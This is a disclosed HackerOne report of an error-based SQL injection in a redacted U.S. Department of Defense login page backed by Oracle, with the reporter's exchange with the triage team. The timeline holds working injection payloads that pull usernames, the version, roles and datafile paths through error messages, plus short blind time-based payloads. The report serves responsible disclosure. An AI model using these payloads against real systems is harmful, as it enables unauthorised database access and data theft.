---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/php
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-05-14
submitted: 2018-11-20T16:11:30.338Z
bounty_usd: null
votes: 12
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "l00ph0le"
source: "https://hackerone.com/reports/447742"
title: "SQL Injection in Login Page: https://█████/█████████/login.php"
---
# SQL Injection in Login Page: https://█████/█████████/login.php

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 12 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-05-14

- Report: [https://hackerone.com/reports/447742](https://hackerone.com/reports/447742)
- CWE: SQL Injection
- Submitted: 2018-11-20T16:11:30.338Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
I believe I've discovered an error based SQL injection in the login page for https://████/██████/login.php.

**Description:**
When browsing to the webpage https://█████/██████/login.php and entering certain control characters into the "Username" field, and SQL error (Oracle) is produced.

## Impact
This is hard to gauge as I did not attempt to fully exploit the SQL injection point. Once I identified that it was an error-based SQL injection, I stopped. The website also has a Web Application Firewall and IPS implemented, so bypasses would need to be used to fully exploit it. I didn't know the rules for this program in regard to bypasses defenses with automated tools like sqlmap the --tamper parameter. 

## Step-by-step Reproduction Instructions

1. Browse to https://█████████/███/login.php
2. Enter " '; --  " into the username field
3. The error "ORA-00933: SQL command not properly ended" is produced

## Product, Version, and Configuration (If applicable)
██████████ █████████ Portal
Version: 3.0.89
Last Modified: Oct 04, 2018 

## Suggested Mitigation/Remediation Actions
Parameterized queries should be used to separate the command and data portions of the intended query to the database. These queries prevent an attacker from tampering with the query logic and extending a concatenated database query string. Code reviews should be conducted to identify any additional areas were the application or other applications in the organization are vulnerable to this attack.
Additionally, input validation should be enforced on the server side in order to ensure that only expected data is sent in queries. Where possible security specific libraries should be used in order to provide an additional layer of protection.

## Impact

A skilled attacker could likely gain access to the database for the website, and depending on the privileges of the database user, gain access to other databases or compromise the system hosting the database engine.

## Timeline

- **Report Filed**
- **2018-11-20** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2018-11-26** @l00ph0le: Hi U.S. DoD,

After further research, I have confirmed that a SQL injection does exist and can be exploited. I found by modifying my original payload in step# 2, I was able to return a list of users in the database.

Modified instructions for reproduction.
1. Browse to https://████/█████████/login.php
2. Enter " 
or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))-- " into the username field
3. The error "ORA-29257: host ███████ " is produced

Thank you

~Nick
- **2018-11-26** @l00ph0le: Sorry, in the payload I missed a single quote. The correct payload is:

Enter " ' or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))-- " into the username field
- **2018-11-26** @l00ph0le: Here is a another payload to get the Oracle version.

" ' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))-- "
- **2018-11-26** @l00ph0le: Below I've provided four more example payloads that should help with gauging the impact of this vulnerability. I was not able to provide an impact in my original report. I'd say the impact is fairly high. 

The SQL injection is unauthenicated, we are able to gather the server's hostname, database user's role information, and database file location on the server. It should be noted that the database user has
the "DBA" role permission, making it an administrator of the database.

Current Database User
" ' or 1=utl_inaddr.get_host_address((select user from dual))-- "

Database Server Hostname
" ' or 1=utl_inaddr.get_host_address((select global_name from global_name))-- "

Current Database User's roles
" ' or 1=utl_inaddr.get_host_address((select sys.stragg(distinct granted_role||chr(32)) from user_role_privs))-- "
Database file location
" ' or 1=utl_inaddr.get_host_address((SELECT name FROM V$DATAFILE where rownum = 1))-- "

I believe this should be enough information to validate the vulnerability/risk from your end. Please let me know if you need further information. My apologies for the choppiness of the report.

Thank you

~Nick
- **Report Severity Updated**
- **Report Triaged**
- **2018-11-29** @l00ph0le: Thank you! If you need anything else, let me know.
- **2018-11-30** @ag3nt-j1: Thanks for finding and submitting.  Sorry it took so long to validate your finding, your report fell off my plate for some reason and I missed it.
- **2018-11-30** @l00ph0le: No problem at all. I figured you were probably playing catch-up from the Thanksgiving holiday.
- **Report Resolved**
- **2018-12-07** @ag3nt-j1: @l00ph0le I'm not 100% convinced that the system owner fixed the issue.  Looks like all they may have done was set a minimum/maximum username length.  I tried some other queries and coludn't get anything to pop.  Closing this as resolved, but feel free to take another look.  Would be happy to reopen if you can find something else.
- **2018-12-07** @l00ph0le: @ag3nt-j1 It looks like they have limited the username field to 25 characters. In addition to limiting the username length, it appears they have either sanitized the control characters " '; -- " or they have suppressed the error messages from being echo'd on the login page. If we assume they only have suppressed the error messages, it turns it into a Blind SQL injection. In order for an attacker to find it, they would need to discover a blind sql injection payload (time-based likely) that could fit into 25 characters. The blind injection payload would give the attacker a visual indication their sql injection is succeeding, like making the page pause for a few seconds before it loads. To find a payload that is 25 characters to do this isn't too hard if the back-end was a mysql or microsoft sql (i.e.mysql:-SLEEP(15) mssql:' waitfor delay '0:0:9' --). Fortunately the back-end is oracle and blind sql injection payloads are a little more complicated. An example payload would be: BEGIN DBMS_LOCK.SLEEP(15); END;. This payload is over 25 characters. So even if an attacker found one to fit, the length limitation would make data exfiltration nearly impossible. They would need more space to ask true or false questions and get their answer based on if the page pause for a few seconds. In my opinion, assuming they didn't parameterize the SQL statement, their fix should mitigate any exploitation attempts of the vulnerability. My apologies if I shared any information you are already aware of, I just felt it would make more sense if the explained my thought process fully.
- **2018-12-07** @l00ph0le: Also I noticed looking through some of the DoD hacktivity, there are some reports that were allowed to be disclosed by the hackerone user (example https://hackerone.com/reports/311922). Is that not the case anymore? Do you allow a summary. I understand if you don't.
- **Agreed On Going Public**
- **2019-12-04** @agent-r5: We will put it in the queue for disclosure.
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
